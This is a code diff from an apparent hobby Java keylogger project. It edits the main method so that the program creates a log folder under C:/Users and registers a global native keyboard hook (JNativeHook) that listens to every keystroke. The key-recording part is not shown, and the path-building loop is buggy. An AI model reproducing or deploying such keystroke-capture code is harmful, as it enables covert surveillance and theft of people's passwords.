@@ -18,27 +18,40 @@ public class MainKey implements NativeKeyListener {
 	private static File ArchivoLog;
 	private static boolean resultado;
 	private static String appPath = "";
-
+	
+	private static String path;
+	
+	
+//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
 	public static void main(String[] args) {
+			int c = 0;
 		
-			//appPath = new File(".").getCanonicalPath();
-			appPath = new File(".").getAbsolutePath();
-			System.out.println(appPath);
-			
-			ArchivoLog = keylog.Crealog("C:/Users/juanc/Documents");
-			if(!ArchivoLog.exists()){
-				resultado = ArchivoLog.mkdirs();
-				System.out.println(resultado);
+		appPath = new File(".").getAbsolutePath();
+		
+		for(int i = 0; i < appPath.length() && c < 3; i++){
+			if(appPath.charAt(i) == '\\'){
+				c++;
+				path += "" + appPath.charAt(i);
 			}
+		}
+		
+		System.out.println(path);
+		
+		//crea carpeta en el directorio
+		ArchivoLog = keylog.Crealog("C:/Users");
+		if(!ArchivoLog.exists()){
+			resultado = ArchivoLog.mkdirs();
+		}
 			
 			
-			try {
-				GlobalScreen.registerNativeHook();
-			} catch (NativeHookException e) {
 			
-				e.printStackTrace();
-			}
-				GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
+		try {
+			GlobalScreen.registerNativeHook();
+		} catch (NativeHookException e) {
+			
+			e.printStackTrace();
+		}
+			GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
 
 }
 	@Override
